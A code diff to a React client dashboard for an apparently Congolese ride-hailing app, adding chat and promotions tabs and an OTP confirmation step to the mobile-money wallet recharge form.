+        {/* ================= TABS VIEW 4.25: GOOGLE CHAT SUPPORT CENTRAL ================= */}
+        {activeTab === "chat" && (
+          <div className="bg-slate-900 border border-slate-850 rounded-3xl overflow-hidden shadow-xl animate-fade-in text-white">
+            <ChatWorkspaceManager isEmbedded={true} />
           </div>
+        )}
+
+        {/* ================= TABS VIEW 4.5: PROMOTIONS & LOYALTY HUB ================= */}
+        {activeTab === "promotions" && (
+          <ClientPromotionHub
+            lang={lang}
+            userId={profile.id}
+            completedRidesCount={profile.ridesCompleted || 0}
+            onApplyPromo={(promo) => {
+              setAppliedPromo(promo);
+              if (promo) {
+                alert(`Code promotionnel ${promo.code} appliqué avec succès ! La remise sera appliquée à votre prochaine commande.`);
+              }
+            }}
+            appliedPromo={appliedPromo}
+            activePickupCommune={selectedCommuneName}
+            activeDropoffCommune={selectedCommuneName}
+            currentEstimatedFareCDF={prices.cdf}
+          />
         )}
 
         {/* ================= TABS VIEW 5: DISPUTE MANAGEMENT (GESTION DES LITIGES) ================= */}
@@ -4969,7 +5296,7 @@ export default function ClientDashboard({
                 </div>
                 <div>
                   <span className="block text-slate-500 text-[8.5px] uppercase font-bold tracking-widest">Facteur de Risque :</span>
-                  <span className="text-red-505 font-black block mt-0.5">{blockedAttack.riskScore}</span>
+                  <span className="text-red-500 font-black block mt-0.5">{blockedAttack.riskScore}</span>
                 </div>
                 <div className="col-span-2 border-t border-slate-850 pt-2.5 mt-1">
                   <span className="block text-slate-500 text-[8.5px] uppercase font-bold tracking-widest">Payload Intercepté :</span>
@@ -5011,119 +5338,174 @@ export default function ClientDashboard({
             </h3>
 
             <form onSubmit={handleRechargeWallet} className="space-y-4">
-              <div className="grid grid-cols-2 gap-3.5">
-                <div>
-                  <label className="block text-[10px] font-bold text-slate-500 uppercase mb-1">Montant à recharger</label>
-                  <input
-                    type="number"
-                    value={rechargeAmount}
-                    onChange={(e) => setRechargeAmount(e.target.value)}
-                    className={`w-full bg-slate-50 border rounded-xl px-3.5 py-2 text-xs text-slate-800 outline-none font-mono font-bold transition-all ${
-                      rechargeAmountError 
-                        ? "border-red-400 focus:border-red-500 bg-red-50/10 focus:ring-1 focus:ring-red-450" 
-                        : "border-slate-200 focus:border-blue-600 focus:ring-1 focus:ring-blue-600"
-                    }`}
-                    required
-                  />
-                  {rechargeAmountError ? (
-                    <p className="text-[9px] text-red-500 font-semibold mt-1 leading-tight">{rechargeAmountError}</p>
-                  ) : (
-                    <p className="text-[9px] text-emerald-600 font-semibold mt-1 leading-tight">✓ Montant valide ({rechargeAmountNum} {rechargeCurrency})</p>
+              {!rechargeOtpSent ? (
+                <>
+                  <div className="grid grid-cols-2 gap-3.5 text-left">
+                    <div>
+                      <label className="block text-[10px] font-bold text-slate-500 uppercase mb-1">Montant à recharger</label>
+                      <input
+                        type="number"
+                        value={rechargeAmount}
+                        onChange={(e) => setRechargeAmount(e.target.value)}
+                        className={`w-full bg-slate-50 border rounded-xl px-3.5 py-2 text-xs text-slate-800 outline-none font-mono font-bold transition-all ${
+                          rechargeAmountError 
+                            ? "border-red-400 focus:border-red-500 bg-red-50/10 focus:ring-1 focus:ring-red-450" 
+                            : "border-slate-200 focus:border-blue-600 focus:ring-1 focus:ring-blue-600"
+                        }`}
+                        required
+                      />
+                      {rechargeAmountError ? (
+                        <p className="text-[9px] text-red-500 font-semibold mt-1 leading-tight">{rechargeAmountError}</p>
+                      ) : (
+                        <p className="text-[9px] text-emerald-600 font-semibold mt-1 leading-tight">✓ Montant valide ({rechargeAmountNum} {rechargeCurrency})</p>
+                      )}
+                    </div>
+
+                    <div>
+                      <label className="block text-[10px] font-bold text-slate-500 uppercase mb-1">Devise</label>
+                      <select
+                        value={rechargeCurrency}
+                        onChange={(e) => setRechargeCurrency(e.target.value as "CDF" | "USD")}
+                        className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-blue-600 font-bold"
+                      >
+                        <option value="CDF">Franc Congolais (CDF)</option>
+                        <option value="USD">Dollar Américain (USD)</option>
+                      </select>
+                    </div>
+                  </div>
+
+                  <div className="text-left">
+                    <label className="block text-[10px] font-bold text-slate-500 uppercase mb-1">Sélectionner un Opérateur</label>
+                    <div className="grid grid-cols-3 gap-2">
+                      <button
+                        type="button"
+                        onClick={() => setRechargeMethod("M-Pesa")}
+                        className={`py-2 px-1 rounded-xl border text-[10px] font-bold transition-all cursor-pointer ${
+                          rechargeMethod === "M-Pesa" ? "bg-orange-50 border-orange-400 text-orange-650 font-extrabold" : "bg-slate-50 border-slate-200 text-slate-500"
+                        }`}
+                      >
+                        M-Pesa (Vodacom)
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => setRechargeMethod("Orange Money")}
+                        className={`py-2 px-1 rounded-xl border text-[10px] font-bold transition-all cursor-pointer ${
+                          rechargeMethod === "Orange Money" ? "bg-amber-50 border-amber-400 text-amber-750 font-extrabold" : "bg-slate-50 border-slate-200 text-slate-500"
+                        }`}
+                      >
+                        Orange Money
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => setRechargeMethod("Airtel Money")}
+                        className={`py-2 px-1 rounded-xl border text-[10px] font-bold transition-all cursor-pointer ${
+                          rechargeMethod === "Airtel Money" ? "bg-red-50 border-red-400 text-red-650 font-extrabold" : "bg-slate-50 border-slate-200 text-slate-500"
+                        }`}
+                      >
+                        Airtel Money
+                      </button>
+                    </div>
+                  </div>
+
+                  <div className="text-left">
+                    <label className="block text-[10px] font-bold text-slate-500 uppercase mb-1">Numéro de Téléphone Mobile Money</label>
+                    <input
+                      type="text"
+                      value={rechargePhone}
+                      onChange={(e) => setRechargePhone(e.target.value)}
+                      className={`w-full bg-slate-50 border rounded-xl px-3.5 py-2 text-xs text-slate-800 outline-none font-mono transition-all ${
+                        rechargePhoneError 
+                          ? "border-red-400 focus:border-red-500 bg-red-50/10 focus:ring-1 focus:ring-red-450" 
+                          : "border-slate-200 focus:border-blue-600 focus:ring-1 focus:ring-blue-600"
+                      }`}
+                      placeholder="+243"
+                      required
+                    />
+                    {rechargePhoneError ? (
+                      <p className="text-[9px] text-red-500 font-semibold mt-1 leading-tight">{rechargePhoneError}</p>
+                    ) : (
+                      <p className="text-[9px] text-emerald-600 font-semibold mt-1 leading-tight">✓ Numéro de téléphone DRC Mobile Money valide</p>
+                    )}
+                  </div>
+
+                  <div className="bg-blue-50 p-3 rounded-xl border border-blue-100 flex items-start gap-2 text-[9px] text-blue-800 text-left">
+                    <Info className="w-3.5 h-3.5 text-blue-600 flex-shrink-0 mt-0.5" />
+                    <span>
+                      Un message de confirmation PIN de transaction vous sera immédiatement envoyé par Vodacom/Airtel/Orange pour valider le débit de votre solde mobile.
+                    </span>
+                  </div>
+                </>
+              ) : (
+                <div className="space-y-4 animate-in fade-in duration-200 text-left">
+                  <div className="bg-blue-50 p-3.5 border border-blue-200 rounded-2xl text-left text-blue-850 space-y-1">
+                    <span className="font-extrabold text-[9px] block uppercase tracking-wider font-mono text-blue-800 flex items-center gap-1.5">
+                      <Lock className="w-3.5 h-3.5 text-blue-600 animate-pulse" />
+                      <span>SÉCURISATION DOUBLE FACTEUR D'ÉTAT</span>
+                    </span>
+                    <p className="text-[10.5px] leading-relaxed text-slate-650 font-sans">
+                      Un code OTP temporaire de certification d'État a été envoyé par SMS civil à votre numéro de rechargement : <b>{rechargePhone}</b>.
+                    </p>
+                  </div>
+
+                  <div className="space-y-1.5 text-left">
+                    <label className="block text-[10px] font-bold text-slate-500 uppercase tracking-wider">Entrez le code OTP à 6 chiffres :</label>
+                    <input
+                      type="text"
+                      maxLength={6}
+                      placeholder="------"
+                      value={rechargeEnteredOtp}
+                      onChange={(e) => setRechargeEnteredOtp(e.target.value)}
+                      className="w-full text-center bg-slate-50 border border-slate-200 rounded-xl py-2.5 text-base font-mono font-extrabold tracking-widest text-[#2563EB] outline-none focus:border-blue-600"
+                      required
+                    />
+                  </div>
+
+                  {rechargeOtpError && (
+                    <p className="text-[10px] text-red-650 font-bold block text-left bg-red-50 px-3 py-1.5 border border-red-200 rounded-lg">{rechargeOtpError}</p>
                   )}
-                </div>
 
-                <div>
-                  <label className="block text-[10px] font-bold text-slate-500 uppercase mb-1">Devise</label>
-                  <select
-                    value={rechargeCurrency}
-                    onChange={(e) => setRechargeCurrency(e.target.value as "CDF" | "USD")}
-                    className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-blue-600 font-bold"
-                  >
-                    <option value="CDF">Franc Congolais (CDF)</option>
-                    <option value="USD">Dollar Américain (USD)</option>
-                  </select>
-                </div>
-              </div>
+                  <div className="flex justify-between items-center text-[10px] pt-1 border-t border-slate-100">
+                    <span className="text-slate-500 font-bold">Volume de transfert :</span>
+                    <span className="font-extrabold text-slate-900 font-mono bg-slate-50 px-2 py-1 rounded border border-slate-100">{rechargeAmount} {rechargeCurrency}</span>
+                  </div>
 
-              <div>
-                <label className="block text-[10px] font-bold text-slate-500 uppercase mb-1">Sélectionner un Opérateur</label>
-                <div className="grid grid-cols-3 gap-2">
                   <button
                     type="button"
-                    onClick={() => setRechargeMethod("M-Pesa")}
-                    className={`py-2 px-1 rounded-xl border text-[10px] font-bold transition-all cursor-pointer ${
-                      rechargeMethod === "M-Pesa" ? "bg-orange-50 border-orange-400 text-orange-650 font-extrabold" : "bg-slate-50 border-slate-200 text-slate-500"
-                    }`}
+                    onClick={() => {
+                      setRechargeOtpSent(false);
+                      setRechargeEnteredOtp("");
+                      setRechargeOtpError(null);
+                    }}
+                    className="text-[9px] text-blue-600 hover:underline block text-center mx-auto cursor-pointer font-bold uppercase tracking-wide font-mono"
                   >
-                    M-Pesa (Vodacom)
-                  </button>
-                  <button
-                    type="button"
-                    onClick={() => setRechargeMethod("Orange Money")}
-                    className={`py-2 px-1 rounded-xl border text-[10px] font-bold transition-all cursor-pointer ${
-                      rechargeMethod === "Orange Money" ? "bg-amber-50 border-amber-400 text-amber-750 font-extrabold" : "bg-slate-50 border-slate-200 text-slate-500"
-                    }`}
-                  >
-                    Orange Money
-                  </button>
-                  <button
-                    type="button"
-                    onClick={() => setRechargeMethod("Airtel Money")}
-                    className={`py-2 px-1 rounded-xl border text-[10px] font-bold transition-all cursor-pointer ${
-                      rechargeMethod === "Airtel Money" ? "bg-red-50 border-red-400 text-red-650 font-extrabold" : "bg-slate-50 border-slate-200 text-slate-500"
-                    }`}
-                  >
-                    Airtel Money
+                    Corriger les informations
                   </button>
                 </div>
-              </div>
-
-              <div>
-                <label className="block text-[10px] font-bold text-slate-500 uppercase mb-1">Numéro de Téléphone Mobile Money</label>
-                <input
-                  type="text"
-                  value={rechargePhone}
-                  onChange={(e) => setRechargePhone(e.target.value)}
-                  className={`w-full bg-slate-50 border rounded-xl px-3.5 py-2 text-xs text-slate-800 outline-none font-mono transition-all ${
-                    rechargePhoneError 
-                      ? "border-red-400 focus:border-red-500 bg-red-50/10 focus:ring-1 focus:ring-red-450" 
-                      : "border-slate-200 focus:border-blue-600 focus:ring-1 focus:ring-blue-600"
-                  }`}
-                  placeholder="+243"
-                  required
-                />
-                {rechargePhoneError ? (
-                  <p className="text-[9px] text-red-500 font-semibold mt-1 leading-tight">{rechargePhoneError}</p>
-                ) : (
-                  <p className="text-[9px] text-emerald-600 font-semibold mt-1 leading-tight">✓ Numéro de téléphone DRC Mobile Money valide</p>
-                )}
-              </div>
-
-              <div className="bg-blue-50 p-3 rounded-xl border border-blue-105 flex items-start gap-2 text-[9px] text-blue-805 text-left">
-                <Info className="w-3.5 h-3.5 text-blue-600 flex-shrink-0 mt-0.5" />
-                <span>
-                  Un message de confirmation PIN de transaction vous sera immédiatement envoyé par Vodacom/Airtel/Orange pour valider le débit de votre solde mobile.
-                </span>
-              </div>
+              )}
 
               <div className="flex gap-3">
                 <button
                   type="button"
-                  onClick={() => setShowRechargeModal(false)}
+                  onClick={() => {
+                    setShowRechargeModal(false);
+                    setRechargeOtpSent(false);
+                    setRechargeEnteredOtp("");
+                    setRechargeOtpError(null);
+                  }}
                   className="flex-1 bg-slate-100 hover:bg-slate-200 text-slate-650 font-bold py-2.5 rounded-xl text-xs cursor-pointer transition-all"
                 >
                   Annuler
                 </button>
                 <button
                   type="submit"
-                  disabled={isRechargeFormInvalid}
+                  disabled={!rechargeOtpSent && isRechargeFormInvalid}
                   className={`flex-1 font-bold py-2.5 rounded-xl text-xs cursor-pointer transition-all shadow-sm ${
-                    isRechargeFormInvalid 
+                    !rechargeOtpSent && isRechargeFormInvalid 
                       ? "bg-slate-250 text-slate-400 cursor-not-allowed border border-slate-200" 
                       : "bg-blue-600 hover:bg-blue-700 text-white"
                   }`}
                 >
-                  Initier la Transaction
+                  {rechargeOtpSent ? "Valider la Recharge" : "Initier la Transaction"}
                 </button>
               </div>
             </form>
